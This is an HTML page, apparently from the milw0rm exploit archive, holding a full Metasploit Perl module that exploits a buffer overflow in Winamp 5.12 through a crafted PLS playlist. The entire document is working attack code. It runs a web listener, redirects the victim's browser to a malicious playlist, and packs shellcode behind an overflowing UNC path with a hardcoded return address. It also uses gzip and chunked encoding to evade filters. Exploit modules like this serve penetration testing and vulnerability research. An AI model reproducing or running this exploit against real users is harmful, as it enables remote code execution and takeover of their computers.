<html><head><title>Winamp <= 5.12 (Crafted PLS) Remote Buffer Overflow Exploit (meta)</title></head><pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::winamp_playlist_unc;

use strict;
use base &quot;Msf::Exploit&quot;;
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

 my $advanced =
  {
	'Gzip'       =&gt; [1, 'Enable gzip content encoding'],
	'Chunked'    =&gt; [1, 'Enable chunked transfer encoding'],
	'Humor'      =&gt; [0, 'Enable humorous song names'],
  };

my $info =
  {
	'Name'           =&gt; 'Winamp Playlist UNC Path Computer Name Overflow',
	'Version'        =&gt; '$Revision: 1.3 $',
	'Authors'        =&gt;
	  [
		'H D Moore &lt;hdm [at] metasploit.com',
		'Faithless &lt;rhyskidd [at] gmail.com&gt;',
	  ],

	'Description'    =&gt;
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the Winamp media player.
	This flaw is triggered when a audio file path is specified, inside a
	playlist, that consists of a UNC path with a long computer name. This
	module delivers the playlist via the browser.
}),

	'Arch'           =&gt; [ 'x86' ],
	'OS'             =&gt; [ 'win32', 'winxp', 'win2003' ],
	'Priv'           =&gt; 0,

	'AutoOpts'       =&gt; { 'EXITFUNC' =&gt; 'process' },
	'UserOpts'       =&gt;
	  {
		'HTTPPORT' =&gt; [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' =&gt; [ 0, 'HOST', 'The local HTTP listener host', &quot;0.0.0.0&quot; ],
	  	'REALHOST' =&gt; [ 0, 'HOST', 'External address to use for redirects (NAT)' ],
	  },

	'Payload'        =&gt;
	  {
		'Space'    =&gt; 526,
		'BadChars' =&gt; &quot;\x00\x5c\x2f\x0a\x0d\x20&quot;,
		'Keys'     =&gt; ['-bind'],
		
		# Landing on \x5c\x5c trashes esp, restore from ecx
		'PrependEncoder' =&gt; &quot;\x87\xe1&quot;,
		
		# Disable nop sleds completely (dont modify ecx)
		'MinNops'  =&gt; 0,
		'MaxNops'  =&gt; 0,
	  },
	'Refs'           =&gt;
	  [
	  	['BID', '16410'],
		['URL', 'http://milw0rm.com/id.php?id=1458/'],
		['URL', 'http://secunia.com/advisories/18649/'],		
	  ],

	'DefaultTarget'  =&gt; 0,
	'Targets'        =&gt;
	  [
	  	# Return to exe, 0x0d is replaced by 0x00 &gt;:-)
		[ 'Winamp 5.12 Universal', 0x0d45fece  ]
	  ],

	'Keys'           =&gt; [ 'winamp' ],

	'DisclosureDate' =&gt; 'Jan 29 2006',
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET-&gt;new(
		LocalHost =&gt; $self-&gt;GetVar('HTTPHOST'),
		LocalPort =&gt; $self-&gt;GetVar('HTTPPORT'),
		ReuseAddr =&gt; 1,
		Listen    =&gt; 1,
		Proto     =&gt; 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self-&gt;PrintLine(&quot;[-] Failed to create local HTTP listener on &quot; . $self-&gt;GetVar('HTTPPORT'));
		return;
	}

	my $httphost = $self-&gt;GetVar('HTTPHOST');
	$httphost = Pex::Utils::SourceIP('1.2.3.4') if $httphost eq '0.0.0.0';

	$self-&gt;PrintLine(&quot;[*] Waiting for connections to http://&quot;. $httphost .&quot;:&quot;. $self-&gt;GetVar('HTTPPORT') .&quot;/&quot;);

	while (defined($client = $server-&gt;accept())) {
		$self-&gt;HandleHttpClient(Msf::Socket::Tcp-&gt;new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd-&gt;PeerPort, $fd-&gt;PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd-&gt;RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd-&gt;RecvLine(10))) {
		$headers .= $line;
		last if $line eq &quot;\r\n&quot;;
	}

	if ($url !~ /\.pls/i) {
		$self-&gt;PrintLine(&quot;[*] HTTP Client connected from $rhost:$rport, redirecting...&quot;);
		my $content =
			&quot;&lt;html&gt;&lt;script&gt;&quot;.
			&quot;document.location='&quot;.RandomPath().&quot;.pls'&quot;.
			&quot;&lt;/script&gt;&lt;body&gt;&quot;.
			&quot;One second please...&lt;/body&gt;&lt;/html&gt;&quot;;	

		$fd-&gt;Send($self-&gt;BuildResponse($content));
		$fd-&gt;Close;
		return;
	}

	my $target_idx  = $self-&gt;GetVar('TARGET');
	my $target      = $self-&gt;Targets-&gt;[$target_idx];
	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	
	my $name = Pex::Text::AlphaNumText(int(rand(32)+1));
	my $file = Pex::Text::AlphaNumText(1026);
	
	substr($file, 1022, 4, pack('V', $target-&gt;[1]));
	substr($file, 0, length($shellcode), $shellcode);
	
	# Too many and it takes too long to load...
	my $pcnt = int(rand(10)+10);
	my $play =
		&quot;[playlist]\r\n&quot;.
			
			$self-&gt;RandomNames($pcnt).
			
			&quot;File&quot;.   ($pcnt+1). &quot;=\\\\$file\r\n&quot; .
			&quot;Title&quot;.  ($pcnt+1). &quot;=$name\r\n&quot;.
			&quot;Length&quot;. ($pcnt+1). &quot;=&quot;.sprintf(&quot;%x&quot;,rand(1024)+1).&quot;\r\n&quot;.
			
			&quot;NumberOfEntries=&quot;.($pcnt+1).&quot;\r\n&quot;. 
			&quot;Version=2\r\n&quot;;

	$self-&gt;PrintLine(&quot;[*] HTTP Client connected from $rhost:$rport, sending &quot;.length($shellcode).&quot; bytes of payload...&quot;);


	$fd-&gt;Send($self-&gt;BuildResponse($play, &quot;audio/x-scpls&quot;));

	# Prevents IE from throwing an error in some cases
	select(undef, undef, undef, 0.1);

	$fd-&gt;Close();
}

sub RandomPath {
	my $self = shift;
	my $path;

	while (length($path) &lt; 32) {
		$path .= &quot;/&quot; . Pex::Text::AlphaNumText(int(rand(30) + 5));
	}
	return $path;
}

sub RandomNames {
	my $self = shift;
	return $self-&gt;RandomNamesFun(@_) if $self-&gt;GetVar('Humor');
	my $scnt = shift;
	
	my $ppad = '';
	
	for my $idx (1..$scnt) {
		my $pname = Pex::Text::AlphaNumText(int(rand(32)+1));
		my $pfile = Pex::Text::AlphaNumText(int(rand(32)+1)).&quot;.mp3&quot;;
		$ppad .=
			&quot;File&quot;.   ($idx). &quot;=&quot;.$pfile.&quot;\r\n&quot; .
			&quot;Title&quot;.  ($idx). &quot;=&quot;.$pname.&quot;\r\n&quot;.
			&quot;Length&quot;. ($idx). &quot;=&quot;.sprintf(&quot;%x&quot;,rand(1024)+1).&quot;\r\n&quot;;	
	}
	return $ppad;
}

sub BuildResponse {
	my ($self, $content, $ctype) = @_;
	$ctype ||= &quot;text/html&quot;;
	
	my $response =
	  &quot;HTTP/1.1 200 OK\r\n&quot; .
	  &quot;Content-Type: $ctype\r\n&quot;;

	if ($self-&gt;GetVar('Gzip')) {
		$response .= &quot;Content-Encoding: gzip\r\n&quot;;
		$content = $self-&gt;Gzip($content);
	}
	if ($self-&gt;GetVar('Chunked')) {
		$response .= &quot;Transfer-Encoding: chunked\r\n&quot;;
		$content = $self-&gt;Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . &quot;\r\n&quot; .
		  &quot;Connection: close\r\n&quot;;
	}

	$response .= &quot;\r\n&quot; . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . &quot;\r\n$chunk\r\n&quot;;
	}
	$chunked .= &quot;0\r\n\r\n&quot;;

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+10;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (&lt;$rdr&gt;);
}


sub RandomNamesFun {
	my $self = shift;
	my $scnt = shift;
	my @ffun = 
	(
		&quot;Angelina vs Rosie O - Butter Time&quot;,	
		&quot;Richards Gerbil Adventure&quot;,
		&quot;Elton John Bachelor Party&quot;,
		&quot;Paris Hilton Greased Chihuahua&quot;,
		&quot;OH MY GOD&quot;,
		&quot;SOMEONE IS OWNING&quot;,
		&quot;MY WINAMP!&quot;,
	);
	
	my $ppad = '';
	
	for my $idx (1..$scnt) {
		my $pname = $ffun[ $idx % scalar(@ffun) ];
		$ppad .=
			&quot;File&quot;.   ($idx). &quot;=&quot;.$pname.&quot;\r\n&quot; .
			&quot;Title&quot;.  ($idx). &quot;=&quot;.$pname.&quot;\r\n&quot;.
			&quot;Length&quot;. ($idx). &quot;=&quot;.sprintf(&quot;%x&quot;,rand(1024)+1).&quot;\r\n&quot;;	
	}
	return $ppad;
}
1;

# milw0rm.com [2006-01-31]</pre></html>